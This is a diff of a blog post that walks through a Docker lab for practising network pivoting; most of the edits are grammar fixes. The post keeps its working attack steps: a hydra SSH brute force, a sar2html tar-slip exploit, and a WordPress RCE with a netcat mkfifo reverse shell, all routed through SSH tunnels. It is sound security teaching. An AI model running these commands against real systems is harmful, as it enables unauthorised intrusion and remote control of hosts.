@@ -19,15 +19,15 @@ Suppose,
 **"B"** has access to **"C"**.<br>
 **"A"** does not have access to **"C"**.<br>
 
-So how can we access **"C"** from **"A"**? Well, that's directly not possible so we use the concept of pivoting. **"A"** can use **"B"** as the foothold to get access to **"C"**.
-**"A"** first compromises the system **"B"** then can use this machine as the launch point to attack the **"C"**. 
+So how can we access **"C"** from **"A"**? Well, that's not possible directly so we use the concept of pivoting. **"A"** can use **"B"** as the foothold to gain access to **"C"**.
+**"A"** first compromises system **"B"** then uses this machine as a launch point to attack **"C"**. 
 
 ## Lab Creation Overview
 
-To have some practises on pivoting I have created a lab in docker.
+To have some practice on pivoting I have created a lab in docker.
 
-The figure below gives the overview of the network setup of the docker-compose files.
-*Victim1* and *Victim2* are our targets.They both are on the same subnet *172.16.101.0/24*  while *Attacker* is on different subnet *172.16.100.0/24*.
+The figure below gives us the overview of network setup of docker-compose files.
+Out targets are *Victim1* and *Victim2*. They are both on the same subnet *172.16.101.0/24*  while the *Attacker* is on a different subnet *172.16.100.0/24*.
 
 Our helper machine  ( gateway machine ) is sitting on both sub-networks.
 
@@ -37,29 +37,29 @@ Our helper machine  ( gateway machine ) is sitting on both sub-networks.
 
 <span style="font-weight: bold; font-size: 2em;">Brief Overview of Docker Compose Files</span>
 
-You can get the docker-compose files from my Github repo.
+You can get the docker-compose files from my Github repository.
 
-Github Link: [Repository](https://github.com/Cimihan123/Pivoting)
+Repository Link: [Github](https://github.com/Cimihan123/Pivoting)
 
-For this lab two networks  are created:- 
+For this lab, two networks  are created:- 
 
 1. **attacker** -> having subnet *172.16.100.0/24*
 
 2. **victim** -> having subnet *172.16.101.0/24*
 
-By default, Docker uses bridge a driver. We are sticking with it although we can specify different network drivers.
+By default, Docker uses a bridge driver. Although we could specify different network drivers, we will be using default driver.
 
 ![ subnet image ><](/assets/img/blog4-pivoting/2-subnet.png)
 <p align="center" style="color:white;">Fig:  docker-compose-subnet.yml</p>
 
 
-Notice *helper* container is built locally. This makes it easy to customize the base image.
-This container is part of both networks: *attacker* and *victim*.
+Notice that *helper* container is built locally. This makes it easy for us to customize the base image.
+This is the container that is part of both networks: *attacker* and *victim*.
 
 ![ helper image ><](/assets/img/blog4-pivoting/3-helper.png)
 <p align="center" style="color:white;" style="color:white;">Fig:  docker-compose.yml</p>
 
-A base image is being pulled. I have enabled ssh root login. I don't recommend doing without proper security guidelines. XD
+A base image is being pulled. I have enabled ssh root login. I don't recommend doing this without proper security guidelines. XD
 
 ![ helper image ><](/assets/img/blog4-pivoting/4-helper-image.png)
 <p align="center" style="color:white;">Fig:  helper.Dockerfile</p>
@@ -74,24 +74,24 @@ A base image is being pulled. I have enabled ssh root login. I don't recommend d
 ![ attacker image ><](/assets/img/blog4-pivoting/5-attacker-image.png)
 <p align="center" style="color:white;">Fig:  attacker.Dockerfile</p>
 
-*victim* container is also built locally. It does have network IP *172.16.101.10*. This is the part of subnet *172.16.101.0/24*.
+*victim* container is also built locally. It does have network IP of *172.16.101.10*. This is part of subnet *172.16.101.0/24*.
 
 ![ victim1 image ><](/assets/img/blog4-pivoting/6-victim1.png)
 <p align="center" style="color:white;">Fig:  docker-compose.yml</p>
 
-The **wget** downloads **sar2html** tool. Github Link: [Repository](https://github.com/cemtan/sar2html/).
+**wget** downloads **sar2html** tool. Github Link: [Repository](https://github.com/cemtan/sar2html/).
 
-It is the plotting tool for system statistics. There is an issue with this tool. We will discuss this later on. For now, just assume there is a vulnerability in this tool.
+It is a plotting tool for used system statistics. There is an issue with this tool. Which we will discuss later on. For now, just assume there is a vulnerability in this tool.
 
 ![ victim1 image ><](/assets/img/blog4-pivoting/6-victim1-image.png)
 <p align="center" style="color:white;">Fig:  victim1.Dockerfile</p>
 
-For *victim2* there is no need to manipulate the image locally. There is already a vulnerable WordPress in the docker hub. We just pull it from there. The below image shows the structure to configure the WordPress as we also need a database server. They are in the same sub-network so they can communicate with each other.
+For *victim2* there is no need to manipulate the image locally. There is already a vulnerable WordPress in the docker hub. We just pull it from there. The image below shows the configuration structure of WordPress with a database server. Both of which are in the same sub-network so they can communicate with each other.
 
 ![ victim2 image ><](/assets/img/blog4-pivoting/7-victim2.png)
 <p align="center" style="color:white;">Fig:  docker-compose.yml</p>
 
-Plus we have **wp-cli** to configure the wordpress setup automatically.
+We also have **wp-cli** to configure the wordpress setup automatically.
 
 ![ victim2 wpcli ><](/assets/img/blog4-pivoting/7-victim2-1.png)
 <p align="center" style="color:white;">Fig:  docker-compose.yml</p>
@@ -99,9 +99,9 @@ Plus we have **wp-cli** to configure the wordpress setup automatically.
 
 ### Docker Compose Build and Run
 
-As far now we have a brief overview of our lab environment. Now we run the docker-compose files and check them.
+This was a brief overview of our lab environment. We will now run the docker-compose files and check them.
 
-We first build them. It may take some time for pulling, download, and installing. Then we create and run the created containers.
+We first need to build them, which may take some time for pulling, download, and installing. We then create and run the built containers.
 ```bash
 docker-compose -f docker-compose-subnet.yml -f docker-compose.yml build
 docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up
@@ -110,13 +110,13 @@ docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up
 
 &nbsp;
 
-There is a total of 5 containers running. Once *Attacker*, *helper*, *victim1* and *victim2* (WordPress & MySQL) are running.
+There are a total of 5 containers running. *Attacker*, *helper*, *victim1* and *victim2* (WordPress & MySQL) are running.
 
 ![ dockercomposeup image ><](/assets/img/blog4-pivoting/8-dockercompose.png)
 <p align="center" style="color:white;">Fig:  docker-compose build & up</p>
 
 
-*attacker* container can reach the *helper* network. You see the successful ping reply back from the *helper*. 
+*attacker* container can reach the *helper* network. You should see a successful ping reply back from the *helper*. 
 
 ```bash
 ping helper
@@ -127,7 +127,7 @@ ping helper
 ![ pinging from attacher to helper image ><](/assets/img/blog4-pivoting/9-attacker-ping-helper.png)
 <p align="center" style="color:white;">Fig:  Ping check from the attacker </p>
 
-I guess you can figure out the connections among containers from the below picture.
+You should be able to figure out the connections between containers using the picture below.
 
 ![ pinging from attacker to helper image ><](/assets/img/blog4-pivoting/10-pingall.png)
 <p align="center" style="color:white;">Fig:  Ping check </p>
@@ -135,7 +135,7 @@ I guess you can figure out the connections among containers from the below pictu
 
 ## Attacking and Pivoting
 
-Let's first prefer discovering the ports in *helper* host. So our target is first to get access to the *helper* host.
+Let's first discover the ports in *helper* host. So our target is the first to get access to the *helper* host.
 
 ```bash
 nmap -sC -sV -T4 172.16.100.11
@@ -143,8 +143,7 @@ nmap -sC -sV -T4 172.16.100.11
 ![ helper nmap scan ><](/assets/img/blog4-pivoting/11-nmap-helper.png)
 <p align="center" style="color:white;">Fig: Nmap scan (helper) </p>
 
-So there is port 22 (ssh) open. We have hydra installed in the attacker machine and a rockyou.txt file.
-Brute forcing the ssh login.
+There is port 22 (ssh) open. We have hydra installed in the attacker machine and a rockyou.txt file, brute forcing the ssh login.
 
 ```bash
 hydra -l root -P /home/rock.txt ssh://172.16.100.11
@@ -154,7 +153,7 @@ hydra -l root -P /home/rock.txt ssh://172.16.100.11
 ![ bruteforce ssh ><](/assets/img/blog4-pivoting/12-hydra.png)
 <p align="center" style="color:white;">Fig: Bruteforce with Hydra </p>
 
-We got the password for the user **root**. Let's try using this cred. So, we are now into the helper machine.
+We got the password for the user **root**. Let's try using this credential. We are now in the helper machine.
 
 ```bash
 ssh root@172.16.100.11
@@ -164,7 +163,7 @@ ssh root@172.16.100.11
 ![  ssh login ><](/assets/img/blog4-pivoting/13-sshlogin.png)
 <p align="center" style="color:white;">Fig: ssh login </p>
 
-There might be new hosts so I am going to scan further to gather new hosts and ports.
+There might be other new hosts so I will keep on scanning further to gather new hosts and ports.
 
 *ifconfig* shows that the *helper* machine is part of two network families.
 
@@ -185,7 +184,7 @@ hostname -I -> displays all the addresses for the host
 
 &nbsp;
 
-Having ssh access makes it very easy for tunneling. Creating dynamically port forwarding leverages the SOCKS proxy. This will deliver all the traffic through an ssh conncetion via given port to the destination server. Here we are forwarding all the traffics to the attacker machine.
+Having ssh access makes it very easy for tunneling. Creating dynamic port forwarding leverages the SOCKS proxy. This will deliver all the traffic through an ssh connection, via, given port to the destination server. Here we are forwarding all the traffics to the attacker machine.
 
 **-N = disable execution of command**
 
@@ -204,19 +203,19 @@ Cross-checking if it is running in the background or not. XD
 ![  netstat ><](/assets/img/blog4-pivoting/17-1-netstat.png)
 <p align="center" style="color:white;">Fig: netstat </p>
 
-What we need now is a proxy tool. I am going to use *proxychains*. Remember the port we mentioned in "/etc/proxychains.conf" should be the same as a dynamic port.
+What we need now is a proxy tool. I am going to use *proxychains*. Remember the port we mentioned in "/etc/proxychains.conf" should be the same as dynamic port.
 
 ![  proxychain ><](/assets/img/blog4-pivoting/18-proxychain.png)
 <p align="center" style="color:white;">Fig: proxychain conf </p>
 
 #### Discovering newer hosts (victims)
 
-The major concern is finding hosts. Having a **map** would have been easier, but you won't find it mostly in real cases.
+The major concern is finding hosts. Having a **map** would have been easier, but generally you won't find it in real world scenarios.
 
 ![  no nmap ><](/assets/img/blog4-pivoting/14-nonmap.png)
 <p align="center" style="color:white;">Fig: no nmap </p>
 
-We are aware now that *helper* is part of two networks. Both *helper* machine and *attacker* machine belong to the same network **"172.16.100.0/24"**. Due to this reason, we are now going to scan the network **"172.16.101.0/24"** to find all live hosts.
+We are now aware that *helper* is part of two networks. Both *helper* machine and *attacker* machine belong to the same network **"172.16.100.0/24"**. Due to this reason, we will now scan network **"172.16.101.0/24"** to find all live hosts.
 
 I am using the **ping sweep** technique to scan new hosts. The below one-liner code will run in parallel mode.
 
@@ -237,11 +236,11 @@ We have now gathered total of 5 live hosts.
 
 <span style="font-weight: bold; font-size: 2em;">Victim 1</span>
 
-The reason why we cannot ping is that proxies do not support **ICMP** protocols. Their working OSI layers are different.
+The reason why we cannot ping, is that proxies do not support **ICMP** protocols. Their working OSI layers are different.
 ![  not working  ><](/assets/img/blog4-pivoting/20-proxy-ping-notworking.png)
 <p align="center" style="color:white;">Fig: Proxymap ping </p>
 
-We cannot ping the hosts however we can use Nmap to scan ports.
+While cannot ping the hosts, we can however use **nmap** to scan ports.
 
 ```bash
 proxychains nmap -sT -Pn -F 172.16.101.20
@@ -256,7 +255,7 @@ Nmap shows that one service is open on port 5000.
 ![  nmap victim1  ><](/assets/img/blog4-pivoting/21-nmap.png)
 <p align="center" style="color:white;">Fig: Nmap scan (victim1) </p>
 
-We have a 200 status code.
+We get a 200 status code.
 ![  curl  ><](/assets/img/blog4-pivoting/22-curl.png)
 <p align="center" style="color:white;">Fig: Curl </p>
 
@@ -266,16 +265,16 @@ Let's see what is running in this port. Opening it in a browser.
 ![  sar2html  ><](/assets/img/blog4-pivoting/23-sar2html.png)
 <p align="center" style="color:white;">Fig: Sar2html </p>
 
-As I said at the beginning of this blog there is a vulnerability in this tool. Actually, there is a **tar2slip** vulnerability.
->**sar2html** is vulnerable to tar slip which leads to arbitrary file write via archive extraction.
+As I said in the beginning of this blog there is a vulnerability in this tool. There is a **tar2slip** vulnerability.
+>**sar2html** is vulnerable to tar slip, which leads to arbitrary file write via archive extraction.
 
-Let's just try exploiting it.
+Let's try exploiting it.
 
 **1. First download the POC generator tool**
 ```bash
 git clone https://github.com/ptoomey3/evilarc.git && cd evilarc  
 ```
-**2. Run the below code**
+**2. Run below code**
 ```bash
 echo exploitation test > test.css 
 ```
@@ -283,6 +282,7 @@ echo exploitation test > test.css
 ```bash
 python2 evilarc.py  -o linux -f pay.tar test.css -p 'static/css' -d 3
 ```
+
 **4. Click on "New Host" then upload the tar file "pay.tar"**
 
 **5. Check for the file.**
@@ -293,7 +293,7 @@ python2 evilarc.py  -o linux -f pay.tar test.css -p 'static/css' -d 3
 ![  file.css check using curl  ><](/assets/img/blog4-pivoting/24-testcss1.png)
 <p align="center" style="color:white;">Fig: Using Curl</p>
 <br>
-We have successfully exploited this issue.
+We have now successfully exploited this issue.
 <br>
 
 **Victim1 is compromised**.
@@ -307,7 +307,7 @@ Again we start with the same tedious *Nmap* scan. There is an http service runni
 ![  wordpress nmap  ><](/assets/img/blog4-pivoting/25-victim-nmap.png)
 <p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>
 
-Here we see MySQL service running on.
+Here we can see MySQL service running.
 
 ![  mysql nmap  ><](/assets/img/blog4-pivoting/25-victim-nmap-mysql.png)
 <p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>
@@ -317,17 +317,17 @@ For now, our target is HTTP service. It is running WordPress cms.
 ![  curl victim2  ><](/assets/img/blog4-pivoting/26-victim2-wp-curl.png)
 <p align="center" style="color:white;">Fig: Check</p>
 
-If we have not automated the installation process with **wp-cli** then we should have to first finish the wordpress setup process manually.
+If we have not automated the installation/setup process with **wp-cli** then we first have to finish it manually.
 
-To know more about this vulnerability in WordPress, you can [Click Me](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html).
+To know more about this vulnerability in WordPress, you can [Click here](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html).
 
 
-It is already configured and installed. The username and password for wp-admin are **"admin"** and **"adminpass"** respectively.
+If it is already configured and installed. The username and password for wp-admin are **"admin"** and **"adminpass"** respectively.
 
 ![  wordpress installation  ><](/assets/img/blog4-pivoting/install.png)
 <p align="center" style="color:white;">Fig: Wordpress Installation</p>
 
-Save the below reverses shell payload.
+Save given reverse shell payload.
 
 ```bash
 #!/bin/bash
@@ -336,7 +336,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 1331 >/tmp/f
 
 <p align="center" style="color:white;">rev.sh</p>
 
-Now save the below POC. Check if you have set the correct http_server and target.
+Now save given POC. Check if you have set the correct http_server and target.
 
 ```bash
 #!/bin/bash
@@ -381,7 +381,7 @@ echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
 
 <span style="font-weight: bold; font-size: 2em;">Testing</span>
 
-So before executing the POC file we have to first ensure that everything is working properly. Getting reverse shell directly from **victim2** machine to **attacker** machine is not possible. Although we have running dynamic port forwarding it is still not going to work.
+So before executing the POC file we first have to ensure that everything is working properly. Getting reverse shell directly from **victim2** machine to **attacker** machine is not possible. Although we have dynamic port forwarding running, it is still not going to work.
 
 ![ check  ><](/assets/img/blog4-pivoting/30-nonc.png)
 
@@ -400,12 +400,12 @@ ssh -R :80:172.16.100.10:80 root@helper -N -f
 ```
 
 This will forward all the traffic (creating a tunnel) from the remote port (**victim2**) 80 to the local machine on port 80 (**attacker**).
-Now when we run the **poc.sh** file, it can make a connection with the attacker python HTTP server. Let's apply this.
+Now, when we run **poc.sh** file, it can make a connection with the attacker python HTTP server. Let's apply this.
 
 ![  download rev.sh  ><](/assets/img/blog4-pivoting/32-download.png)
 <p align="center" style="color:white;">Fig: downloading rev.sh</p>
 
-We are now one step away from getting a reverse shell.Again we remote port forward.
+We are now one step away from getting a reverse shell. We remote port forward again.
 
 ```bash
 ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
@@ -421,7 +421,7 @@ Finally, we are into the vulnerable WordPress machine.
 
 <span style="font-weight: bold; font-size: 2em;">Caveat</span>
 
-By default, ssh disables **GatewayPorts**.It would make any remote IP only bind to 127.0.0.1:\<port\> and allows to connect only from the server host.
+By default, ssh disables **GatewayPorts**.It would make any remote IP only bind to 127.0.0.1:\<port\> and allow to connect only from the server host.
 
 ![  Explain  ><](/assets/img/blog4-pivoting/32-explain.png)
 
